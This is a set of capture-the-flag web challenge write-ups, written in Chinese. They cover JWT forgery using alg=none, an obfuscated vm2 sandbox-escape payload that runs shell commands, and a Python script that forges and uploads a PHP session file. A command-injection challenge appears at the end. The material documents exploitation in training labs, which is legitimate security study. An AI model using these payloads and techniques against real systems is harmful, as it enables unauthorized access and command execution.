## EasyLogin

```JS
/**
 *  或许该用 koa-static 来处理静态文件
 *  路径该怎么配置？不管了先填个根目录XD
 */

function login() {
    const username = $("#username").val();
    const password = $("#password").val();
    const token = sessionStorage.getItem("token");
    $.post("/api/login", {username, password, authorization:token})
        .done(function(data) {
            const {status} = data;
            if(status) {
                document.location = "/home";
            }
        })
        .fail(function(xhr, textStatus, errorThrown) {
            alert(xhr.responseJSON.message);
        });
}

function register() {
    const username = $("#username").val();
    const password = $("#password").val();
    $.post("/api/register", {username, password})
        .done(function(data) {
            const { token } = data;
            sessionStorage.setItem('token', token);
            document.location = "/login";
        })
        .fail(function(xhr, textStatus, errorThrown) {
            alert(xhr.responseJSON.message);
        });
}

function logout() {
    $.get('/api/logout').done(function(data) {
        const {status} = data;
        if(status) {
            document.location = '/login';
        }
    });
}

function getflag() {
    $.get('/api/flag').done(function(data) {
        const {flag} = data;
        $("#username").val(flag);
    }).fail(function(xhr, textStatus, errorThrown) {
        alert(xhr.responseJSON.message);
    });
}

```

基于框架提示拿代码

```js
const crypto = require('crypto');
const fs = require('fs')
const jwt = require('jsonwebtoken')

const APIError = require('../rest').APIError;

module.exports = {
    'POST /api/register': async (ctx, next) => {
        const {username, password} = ctx.request.body;

        if(!username || username === 'admin'){
            throw new APIError('register error', 'wrong username');
        }

        if(global.secrets.length > 100000) {
            global.secrets = [];
        }

        const secret = crypto.randomBytes(18).toString('hex');
        const secretid = global.secrets.length;
        global.secrets.push(secret)

        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});

        ctx.rest({
            token: token
        });

        await next();
    },

    'POST /api/login': async (ctx, next) => {
        const {username, password} = ctx.request.body;

        if(!username || !password) {
            throw new APIError('login error', 'username or password is necessary');
        }

        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;

        console.log(sid)

        if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {
            throw new APIError('login error', 'no such secret id');
        }

        const secret = global.secrets[sid];

        const user = jwt.verify(token, secret, {algorithm: 'HS256'});

        const status = username === user.username && password === user.password;

        if(status) {
            ctx.session.username = username;
        }

        ctx.rest({
            status
        });

        await next();
    },

    'GET /api/flag': async (ctx, next) => {
        if(ctx.session.username !== 'admin'){
            throw new APIError('permission error', 'permission denied');
        }

        const flag = fs.readFileSync('/flag').toString();
        ctx.rest({
            flag
        });

        await next();
    },

    'GET /api/logout': async (ctx, next) => {
        ctx.session.username = null;
        ctx.rest({
            status: true
        })
        await next();
    }
};
```
注册时admin无法注册，猜测为登录admin用户，结合拿到的js代码可能是jwt伪造

注册时拿到认证authorization

将认证的authorization，修改值生成对应的值，将alg设置为none(部分jwt库支持无算法，无算法就不进行签名校验)，secretid设置为小数绕过jwt的校验

![](attachments/Pasted%20image%2020240329175806.png)

![](attachments/Pasted%20image%2020240329175628.png)

拿到cookie后，访问/api/flag即可

![](attachments/Pasted%20image%2020240329180039.png)

>不知道为什么jwt_tools生成的和pyhon直接生成的有差异，用不了


## JustEscape
#VM2
run.php

```php
<?php  
if( array_key_exists( "code", $_GET ) && $_GET[ 'code' ] != NULL ) {    $code = $_GET['code'];  
    echo eval(code);  
} else {    highlight_file(__FILE__);  
}  
?>
```

但是根据赛题提示一个不是php

Error().stack; 后报错为js
![](attachments/Pasted%20image%2020240330111236.png)

应该是vm2沙箱逃逸
[Breakout in v3.8.3 · Issue #225 · patriksimek/vm2 (github.com)](https://github.com/patriksimek/vm2/issues/225)
payload
```JS
(function (){
    TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();
    try{
        Object.preventExtensions(Buffer.from(``)).a = 1;
    }catch(e){
        return e[`${`${`get_proces`}s`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();
    }
})()
```

![](attachments/Pasted%20image%2020240330114107.png)

## BabyUpload
```php
<?php  
error_reporting(0);  
session_save_path("/var/babyctf/");  
session_start();  
require_once "/flag";  
highlight_file(__FILE__);  
if($_SESSION['username'] ==='admin')  
{    
	$filename='/var/babyctf/success.txt';  
    if(file_exists($filename)){            
	    safe_delete($filename);  
            die($flag);  
    }  
}  
else{    
	$_SESSION['username'] ='guest';  
}  
$direction = filter_input(INPUT_POST, 'direction');  
$attr = filter_input(INPUT_POST, 'attr');  
$dir_path = "/var/babyctf/".$attr;  
if($attr==="private"){    
	$dir_path .= "/".$_SESSION['username'];  
}  
if($direction === "upload"){  
    try{  
        if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){  
            throw new RuntimeException('invalid upload');  
        }        
        $file_path = $dir_path."/".$_FILES['up_file']['name'];        
        $file_path .= "_".hash_file("sha256",$_FILES['up_file']['tmp_name']);  
        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){  
            throw new RuntimeException('invalid file path');  
        }  
        @mkdir($dir_path, 0700, TRUE);  
        if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){            
	        $upload_result = "uploaded";  
        }else{  
            throw new RuntimeException('error while saving');  
        }  
    } catch (RuntimeException $e) {        
	    $upload_result = $e->getMessage();  
    }  
} elseif ($direction === "download") {  
    try{        
	    $filename = basename(filter_input(INPUT_POST, 'filename'));        
	    $file_path = $dir_path."/".$filename;  
        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){  
            throw new RuntimeException('invalid file path');  
        }  
        if(!file_exists($file_path)) {  
            throw new RuntimeException('file not exist');  
        }        header('Content-Type: application/force-download');        
	        header('Content-Length: '.filesize($file_path));        
		        header('Content-Disposition: attachment; filename="'.substr($filename, 0, -65).'"');  
        if(readfile($file_path)){            
	        $download_result = "downloaded";  
        }else{  
            throw new RuntimeException('error while saving');  
        }  
    } catch (RuntimeException $e) {        
	    $download_result = $e->getMessage();  
    }  
    exit;  
}  
?>
```

查看自己sess的内容
![](attachments/Pasted%20image%2020240331141326.png)

![](attachments/Pasted%20image%2020240331141915.png)

有一个08的不可见字符session处理器为`php_binary`

伪造一个为admin的sess上传后访问应该就可以拿到flag，file_exists检查目录和文件的存在，创建一个success.txt目录就可以通过检查

```python
import requests  
from io import BytesIO  
import hashlib  
  
url = 'http://4c6707b5-eec5-47b1-921a-c61e06fa477c.node5.buuoj.cn:81/index.php'  
  
files = {'up_file': ('sess', BytesIO('\x08usernames:5:"admin";'.encode('utf-8')))}  
  
data1 = {  
    'direction': 'upload',  
    'attr': ''  
}  
  
# 上传sess 文件  
  
res1 = requests.post(url, data=data1, files=files)  
  
# 计算sha256 sessid  
  
sessId = hashlib.sha256('\x08usernames:5:"admin";'.encode('utf-8')).hexdigest()  
  
print(sessId)  
  
# success.txt目录创建  
  
data2 = {  
    'attr': 'success.txt',  
    'direction': 'upload'  
}  
  
res2 = requests.post(url, data=data2, files=files)  
  
# 访问拿flag  
  
cookies = {  
    'PHPSESSID': sessId  
}  
  
res3 = requests.post(url, cookies=cookies)  
print(res3.text)
```

URL二次编码绕过

index.php是空的

拿到GWHT.php

```PHP
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>count is here</title>

    <style>

        html,
        body {
            overflow: none;
            max-height: 100vh;
        }

    </style>
</head>

<body style="height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;">

<center><img src="question.jpg" height="200" width="200" /> </center>

    <?php
    ini_set('max_execution_time', 5);

    if ($_COOKIE['pass'] !== getenv('PASS')) {
        setcookie('pass', 'PASS');
        die('<h2>'.'<hacker>'.'<h2>'.'<br>'.'<h1>'.'404'.'<h1>'.'<br>'.'Sorry, only people from GWHT are allowed to access this website.'.'23333');
    }
    ?>

    <h1>A Counter is here, but it has someting wrong</h1>

    <form>
        <input type="hidden" value="GWHT.php" name="file">
        <textarea style="border-radius: 1rem;" type="text" name="count" rows=10 cols=50></textarea><br />
        <input type="submit">
    </form>

    <?php
    if (isset($_GET["count"])) {
        $count = $_GET["count"];
        if(preg_match('/;|base64|rot13|base32|base16|<\?php|#/i', $count)){
        	die('hacker!');
        }
        echo "<h2>The Count is: " . exec('printf \'' . $count . '\' | wc -c') . "</h2>";
    }
    ?>

</body>

</html>
```

![](attachments/Pasted%20image%2020240331154025.png)

```php
<?php
$pass = "GWHT";
// Cookie password.
echo "Here is nothing, isn't it ?";

header('Location: /');

```

![](attachments/Pasted%20image%2020240331155232.png)

readme里面有hash

![](attachments/Pasted%20image%2020240331155434.png)


`echo 'GWHTCTF' | su - GWHT -c 'cat /GWHT/system/of/a/down/flag.txt'`

![](attachments/Pasted%20image%2020240331160224.png)